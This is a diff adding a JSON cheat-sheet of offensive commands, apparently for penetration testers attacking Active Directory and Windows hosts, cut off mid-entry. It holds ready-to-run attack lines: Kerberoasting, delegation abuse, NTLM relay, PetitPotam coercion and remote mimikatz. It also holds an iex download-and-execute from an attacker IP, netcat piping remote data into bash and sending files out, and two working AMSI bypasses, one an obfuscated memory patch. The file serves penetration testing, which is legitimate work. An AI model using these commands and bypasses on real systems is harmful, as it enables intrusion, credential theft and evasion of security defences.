@@ -1,0 +1,3083 @@
+[
+  {
+    "description": "PSCredential is a PowerShell cmdlet used to create a credential object. It is used to securely store and retrieve usernames and passwords in scripts or commands. Via the GetNetworkCredential method it is possible to retrieve the password.  \n\nCommand Reference:\n```\n\tVariable name: $cred\n\n  Method: GetNetworkCredential\n```\n",
+    "command": "$cred.GetNetworkCredential().Password\n",
+    "code": "$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force\n\n$Cred = New-Object System.Management.Automation.PSCredential('htb.local\\mmaas', $pass)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Cracking"
+    ],
+    "references": [
+      "https://jatinpurohit.wordpress.com/2020/04/08/decrypt-pscredential-object-password-and-its-applications/"
+    ],
+    "name": "PSCredential-decrypt"
+  },
+  {
+    "description": "Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniques. The following command will attempt to enumerate information provided valid login credentials.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "enum4linux -u john -p password123 -a 10.10.10.1\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/CiscoCXSecurity/enum4linux"
+    ],
+    "name": "Enum4Linux-Creds"
+  },
+  {
+    "description": "Impacket's samrdump.py communicates with the Security Account Manager Remote (SAMR) interface to list system user accounts, available resource shares, and other sensitive information.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 samrdump.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "RPC"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py",
+      "https://www.hackingarticles.in/impacket-guide-smb-msrpc/"
+    ],
+    "name": "Impacket-SAMRDump"
+  },
+  {
+    "description": "Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer with security descriptor of another computer.\nThe following command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property of DC01.\nThis basically means that EVILCOMPUTER can get impersonated service tickets for DC01 using getST.py.\n\nCommand Reference:\n\n  Target IP: 10.10.10.1\n\n  Domain: test.local\n\n  Username: john\n\n  Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA\n\n  Delegate To: DC01$\n\n  Delegate From: EVILCOMPUTER$\n",
+    "command": "python3 rbcd.py -action write -delegate-to \"DC01$\" -delegate-from \"EVILCOMPUTER$\" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john\n",
+    "items": [
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "Kerberos",
+      "SMB",
+      "LDAP"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "PrivEsc",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py",
+      "https://github.com/tothi/rbcd-attack"
+    ],
+    "name": "Impacket-RBCD"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
+    "command": "crackmapexec ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups\n",
+    "items": [
+      "Username",
+      "Password",
+      "Hash"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Enum-LDAP"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate the SMB host using a null session. \n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "crackmapexec smb 10.10.10.1 -u '' -p ''\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Enum-SMB-Null"
+  },
+  {
+    "description": "Snaffler is a tool used to enumerate sensitive data (passwords, PII, etc.) from file shares in Active Directory. It searches for interesting files based on file extensions, file names, and file content that's matched against regex. It's also highly configurable, allowing you to add your own regex searches. The following command will enumerate all machines in the domain and search for accessible file shares, checking for interesting files that might have sensitive data.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tDomain Controller: 10.10.10.1\n",
+    "command": "Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SnaffCon/Snaffler"
+    ],
+    "name": "Snaffler"
+  },
+  {
+    "description": "PKINIT gettgtpkinit.py request a TGT using a PFX file, either as file or as base64 encoded blob, or PEM files for cert+key. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool.\n\nCommand Reference:\n  ```\n  Domain: test.local\n\n  Host that you got the certificate from: DC01\n\n  PFX file: crt.pfx\n\n  PFX file password: password123\n\n  TGT requested: out.ccache\n  ```\n",
+    "command": "python3 gettgtpkinit.py test.local/DC01\\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache\n",
+    "items": [
+      "Username",
+      "Password",
+      "PFX"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/dirkjanm/PKINITtools",
+      "https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/"
+    ],
+    "name": "PKINIT-gettgtpkinit"
+  },
+  {
+    "description": "Get-SQLInstanceDomain is a function in PowerUpSQL, a PowerShell module for SQL Server exploitation. It enumerates SQL Server instances within the current domain, aiding in identifying database servers. This command assists security professionals in assessing database security by locating instances that might be susceptible to unauthorized access or attacks. This command can be executed from a non-domain joined device if you have credentials, but on a domain joined machine you do not need to specify the credentials.\n\nCommand Reference:\n```\nIP address Domaincontroller: 10.0.0.1\n\nDomain: domain.local\n\nUser: mmaas\n\nPassword: Password123\n```\n",
+    "command": "Get-SQLInstanceDomain -Verbose -DomainController 10.0.0.1 -Username domain.local\\mmaas -password Password123\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "SQL"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet",
+      "https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1"
+    ],
+    "name": "PowerUpSQL-Get-SQLInstanceDomian-listmssql"
+  },
+  {
+    "description": "This is useful for user account/password brute force guessing and username enumeration when usernames are based on the users' names. By attempting a few weak passwords across a large set of user accounts, user account lockout thresholds can be avoided.\n\nCommand Reference:\n```\nFirstname: maurits\n\nLastname: maas\n```\n",
+    "command": "./username-anarchy maurits maas\n",
+    "items": [
+      "Password",
+      "Username",
+      "No_creds"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Cracking",
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/urbanadventurer/username-anarchy"
+    ],
+    "name": "username-anarchy"
+  },
+  {
+    "description": "(New-Object Net.WebClient).DownloadString is a PowerShell command that uses the .NET WebClient class to download and EXECUTE a file from the server without saving the file.\n\nCommand Reference:\n\n\tLocation of file: http://10.10.14.21:8999/SharpHound.ps1\n",
+    "command": "iex(new-object net.webclient).downloadstring(\"http://10.10.14.21:8999/SharpHound.ps1\")\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      "https://learn.microsoft.com/de-de/dotnet/api/system.net.webclient.downloadstring?view=net-5.0",
+      "https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters"
+    ],
+    "name": "DownloadString"
+  },
+  {
+    "description": "SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, without credentials (null session).\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tSMB Hosts: smb-hosts.txt\n",
+    "command": "python3 smbmap.py --host-file smb-hosts.txt -d test.local -L\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ShawnDEvans/smbmap",
+      "https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/"
+    ],
+    "name": "SMBMap-Enum-Share-Anonymous"
+  },
+  {
+    "description": "The xattr command can be used to display, modify or remove the extended attributes (like quarantine) of one or more files, including directories and symbolic links. Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).\n\nCommand Reference:\n```\nAttribute: com.apple.quarantine (Quarantine)\n\nApplication in quarantine: Bloodhoud.app\n```\n",
+    "command": "xattr -d com.apple.quarantine Bloodhound.app\n",
+    "code": "extra code can be placed here. This part is optional and can be removed if not nessasary. \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV"
+    ],
+    "OS": [
+      "Mac"
+    ],
+    "attack_types": [
+      "Bypassing"
+    ],
+    "references": [
+      "https://keith.github.io/xcode-man-pages/xattr.1.html",
+      "https://derflounder.wordpress.com/2012/11/20/clearing-the-quarantine-extended-attribute-from-downloaded-applications/"
+    ],
+    "name": "xaddr-quarantaine"
+  },
+  {
+    "description": "Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py",
+      "https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"
+    ],
+    "name": "Impacket-GetUserSPNs"
+  },
+  {
+    "description": "PowerView is a module within PowerSploit written in PowerShell to gain network situational awareness on Windows domains. The below command will query the Domain Controller for a list of available shares that the current user has access to.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n",
+    "command": "Find-DomainShare -CheckShareAccess -Domain test.local -DomainController 10.10.10.1\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
+      "https://www.attackdebris.com/?p=470"
+    ],
+    "name": "PowerView-Find-DomainShare"
+  },
+  {
+    "description": "Impacket's getTGT.py uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tHash: 2a3de7fe356ee524cc9f3d579f2e0aa7\n",
+    "command": "python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7\n",
+    "items": [
+      "Hash",
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py",
+      "https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"
+    ],
+    "name": "Impacket-getTGT"
+  },
+  {
+    "description": "The Netcat (nc) command is a command-line utility for reading and writing data between two computer networks. Which can be used to transfer files between victim and attacker.\n\nCommand Reference:\n\n\tFile to copy: linpeas.sh\n\n\tPort: 9001\n\n\tIP address: 10.10.21.14\n",
+    "command": "nc -lvnp 9001 < linpeas.sh\n",
+    "code": "Copy from attacker to victim:  \nnc -lvnp 9001 < linpeas.sh (attacker) \n  \nnc 10.10.21.14 9001 | bash (victim)\n\nCopy from victim to attacker: \nnc 10.10.21.14 9001 < file.txt (victim)\n  \nnc -lvnp 9001 > file.txt (attacker)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": null,
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      "https://medium.com/iostrap/how-to-transfer-files-between-servers-using-netcat-d8bc13eebea",
+      "https://linux.die.net/man/1/nc"
+    ],
+    "name": "netcat-copy_file"
+  },
+  {
+    "description": "ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.\n\nCommand Reference:\n\n\tDomain: test.local\n  \n\tUsername: ldap\n  \n\tPassword: password123\n",
+    "command": "ldapsearch -h test.local -D 'ldap@test.local' -w password123 -b 'dc=test,dc=local'\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://linux.die.net/man/1/ldapsearch"
+    ],
+    "name": "LDAPSearch-Creds"
+  },
+  {
+    "description": "John the Ripper is a popular password cracking tool that uses a variety of techniques to guess passwords. When used to crack an SSH key, John can attempt to guess the passphrase used to encrypt the private key, allowing an attacker to gain unauthorized access to the remote server.\n\nCommand Reference:\n```\nWordlist: /opt/wordlists/rockyou.txt\n\nPrivate SSH key in John format: sshkey.john\n```\n",
+    "command": "john --wordlist=/opt/wordlists/rockyou.txt sshkey.john\n",
+    "code": "sshng2john.py id_rsa\n",
+    "items": [
+      "SSH_key"
+    ],
+    "services": [
+      "SSH"
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Cracking"
+    ],
+    "references": [
+      "https://github.com/openwall/john",
+      "https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/",
+      "https://github.com/Kyuu-Ji/htb-write-up/blob/master/tenten/write-up-tenten.md"
+    ],
+    "name": "John-crackSSH"
+  },
+  {
+    "description": "Impacket's mimikatz.py will drop you into a mimikatz shell on the target machine, allowing you to perform any mimikatz-related actions, such as dumping credentials from memory, dumping keys, etc.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 mimikatz.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/mimikatz.py",
+      "https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"
+    ],
+    "name": "Impacket-Mimikatz"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will execute a powershell command on the target machine if the user has Administrator privileges. using \"-x\" will execute from cmd.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
+    "command": "crackmapexec smb 10.10.10.1 -u 'john' -p 'password123' -X 'whoami'\n",
+    "items": [
+      "Username",
+      "Password",
+      "Hash"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Exec-SMB"
+  },
+  {
+    "description": "In this Amsi Bypass it copies C:\\Windows\\System32\\wscript.exe binary to a different location and rename in to AMSI.dll in order to prevent loading the real AMSI.dll. Add the code at the beginning of your evil Jscript file to turn off the AMSI.\n\nCommand Reference:\n```\nAMSI.dll: DLL to be overwritten\n\nwscript.exe: Excutable which will be copied into modified AMSI.dll\n\n-e:  option indicates that the specified script file will be processed by jscript.dll (GUID)\n\nGUID: F414C262-6AC0-11CF-B6D1-00AA00BBBB58\n```\n",
+    "command": "AMSI Bypass in JScript renaming AMSI.dll\n",
+    "code": "var filesys= new ActiveXObject(\"Scripting.FileSystemObject\"); \nvar sh = new ActiveXObject('WScript.Shell');\ntry\n{\n    if(filesys.FileExists(\"C:\\\\Windows\\\\Tasks\\\\AMSI.dll\")==0)\n    {\n        throw new Error(1, '');\n    } \n}\ncatch(e)\n{\n    filesys.CopyFile(\"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"C:\\\\Windows\\\\Tasks\\\\AMSI.dll\");\n    sh.Exec(\"C:\\\\Windows\\\\Tasks\\\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}\"+WScript.ScriptFullName);\n    WScript.Quit(1); \n}\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Bypassing"
+    ],
+    "references": [
+      "https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass#jscript",
+      "LINK"
+    ],
+    "name": "AMSI-Bypass-Jscript_AMSI_dll_rename"
+  },
+  {
+    "description": "PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "RPC",
+      "NTLM"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/topotam/PetitPotam",
+      "https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory"
+    ],
+    "name": "PetitPotam"
+  },
+  {
+    "description": "ConvertTo-SecureString PowerShell command is used to convert plain text into an encrypted form that can be used for secure storage or transmission. It takes a plain text string and converts it to a secure string object that can be saved to a file or used in memory for authentication or encryption purposes.\n\nCommand Reference:\n\n\tVariable name: $pass\n\n\tPassword: password123\n",
+    "command": "$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force\n",
+    "items": [
+      "Shell"
+    ],
+    "services": null,
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.3",
+      "https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-1/"
+    ],
+    "name": "SecureString"
+  },
+  {
+    "description": "Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n",
+    "command": "export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass\n",
+    "items": [
+      "TGS",
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py",
+      "https://www.sans.org/blog/psexec-python-rocks/",
+      "https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack"
+    ],
+    "name": "Impacket-PsExec-PassTheTicket"
+  },
+  {
+    "description": "Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).\n\nThe below command will perform WPAD spoofing to force the victim machine to authenticate to the attacker controlled host. The command will then relay the authentication to create a new computer object and grant it delegation rights to impersonate users on the victim machine. This command should be used in conjunction with mitm6.\n\nCommand Reference:\n\n\tTarget Domain Controller: dc.test.local\n",
+    "command": "python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegat-access\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "NTLM",
+      "LDAP"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",
+      "https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/"
+    ],
+    "name": "Impacket-NTLMRelayX-WPAD"
+  },
+  {
+    "description": "Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).\n\nThe below command creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate and execute 'whoami /all'. In order for the SMB server to recieve credentials to relay, dementor.py can be used to trigger a forced authentication from the IP it's targeting to an attacker controlled SMB server.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "NTLM"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",
+      "https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack"
+    ],
+    "name": "Impacket-NTLMRelayX"
+  },
+  {
+    "description": "One-liner to bypass the AMSI in a Powershell. Done by overwriting the amsiContext header by copying data (four zeros) from managed to unmanaged memory. When the context structure header is overwritten, this should force AmsiOpenSession to error out. The additional code is Rasta Mouse's memory patch to bypass AMSI, run the one-liner and the additional code to disable AMSI in powershell.\n\nCommand Reference:\n```\nloop the GetTypes method, searching for all types containing the string \u201ciUtils\u201d in its name\n\nGetFields accepts filtering modifiers, we\u2019ll apply the NonPublic and Static filters to help narrow the results\n\nloop through all the fields, searching for a name containing \u201cContext\u201d, as this does not be marked as malicious looking for the amsiContext\n\nuse Copy to overwrite the amsiContext header by copying data (four zeros) from managed to unmanaged memory\n```\n",
+    "command": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)\n",
+    "code": "#Rasta-mouses Amsi-Scan-Buffer patch \\n\n$kizax = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class kizax {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yjnqcb, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $kizax\n\n$rykogwu = [kizax]::LoadLibrary(\"$(('\u00e0m'+'s\u00ee'+'.d'+'ll').noRMaLiZe([CHAr]([BYte]0x46)+[ChAr]([BYTE]0x6f)+[chAR]([BYTe]0x72)+[Char](109*8/8)+[chaR](68*31/31)) -replace [cHaR](92+76-76)+[cHaR]([byTE]0x70)+[cHar](107+16)+[chAr]([BYtE]0x4d)+[char]([BytE]0x6e)+[cHAr]([byTe]0x7d))\")\n$iyslea = [kizax]::GetProcAddress($rykogwu, \"$(('\u00c3ms\u00eeSc\u00e2n'+'Buffer').normaliZe([ChAr]([bYTe]0x46)+[CHaR]([byte]0x6f)+[chAR]([BYTE]0x72)+[cHar]([byte]0x6d)+[chaR]([byTe]0x44)) -replace [char]([bYTe]0x5c)+[char](112*56/56)+[CHAR](123)+[CHAr](75+2)+[char](94+16)+[ChAR]([ByTE]0x7d))\")\n$p = 0\n[kizax]::VirtualProtect($iyslea, [uint32]5, 0x40, [ref]$p)\n$aapt = \"0xB8\"\n$qkwf = \"0x57\"\n$snxi = \"0x00\"\n$wnan = \"0x07\"\n$nchj = \"0x80\"\n$yywa = \"0xC3\"\n$estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)\n[System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Bypassing"
+    ],
+    "references": [
+      "https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4"
+    ],
+    "name": "AMSI-Bypass-amsiContext"
+  },
+  {
+    "description": "pyWhisker is a tool allowing users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object. It's based on Impacket and on our Python equivalent of Michael Grafnetter's DSInternals called PyDSInternals. This tool, along with Dirk-jan's PKINITtools allow for a complete primitive exploitation on UNIX-based systems only.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 pywhisker.py -d \"test.local\" -u \"john\" -p \"password123\" --target \"user2\" --action \"list\" --dc-ip \"10.10.10.1\"\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/shutdownrepo/pywhisker"
+    ],
+    "name": "PyWhisker"
+  },
+  {
+    "description": "SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and stores the output in a zip file that can be directly placed in the BloodHound GUI.\n\nCommand Reference:\n```\n\tOutput File: output.zip\n  \n  -d: domain name\n\n  --CollectionMethod: All,GPOLocalGroup (because All skips GPOLocalGroup)\n```\n",
+    "command": "SharpHound.exe -d contoso.local --CollectionMethod All,GPOLocalGroup --ZipFileName output.zip\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc",
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/BloodHoundAD/SharpHound",
+      "https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html"
+    ],
+    "name": "SharpHound"
+  },
+  {
+    "description": "rpcclient is a tool used for executing client side MS-RPC functions to manage Windows NT clients from Unix workstatios. From an offensive security standpoint, it can be used to enumerate users, groups, and other potentially sensitive information. The following command attempt to connect to the NetBIOS server anonymously, in order to enumerate using MS-RPC available commands/functions.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "rpcclient -U '' -N 10.10.10.1\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "RPC"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html",
